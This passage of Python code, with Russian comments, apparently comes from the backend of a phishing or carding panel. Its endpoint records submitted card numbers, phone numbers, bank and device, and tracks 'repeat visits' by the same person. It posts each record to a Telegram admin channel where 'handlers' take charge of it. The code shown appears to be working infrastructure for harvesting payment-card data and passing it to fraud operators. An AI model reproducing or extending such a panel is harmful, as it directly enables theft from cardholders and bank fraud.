            phone=phone,
            bank=bank,
            device=device,
            handler_id=old_log.handler_id,
            handler_name=old_log.handler_name,
            status="taken",
            topic="🔄 | ПОВТОРНЫЙ ПЕРЕХОД"
        )
        await log.save()
        
        try:
            msg = await bot.send_message(
                ADMIN_CHANNEL,
                format_repeat_log_message(log),
                reply_markup=get_repeat_log_keyboard(log.id),
                reply_to_message_id=old_log.message_id
            )
            log.message_id = msg.message_id
            await log.save()
        except Exception as e:
            logger.error(f"Ошибка: {e}")
        
        return {"success": True, "log_id": log.id}
    
    else:
        log = Log(
            card_number=card,
            phone=phone,
            bank=bank,
            device=device,
            status="waiting"
        )
        await log.save()
        
        try:
            msg = await bot.send_message(
                ADMIN_CHANNEL,
                format_log_message(log),
                reply_markup=get_new_log_keyboard(log.id)
            )
            log.message_id = msg.message_id
            await log.save()
        except Exception as e:
            logger.error(f"Ошибка: {e}")
        
        return {"success": True, "log_id": log.id}

# ============================================
# ЗАПУСК
# ============================================

if __name__ == "__main__":
    uvicorn.run(app, host=API_HOST, port=API_PORT)
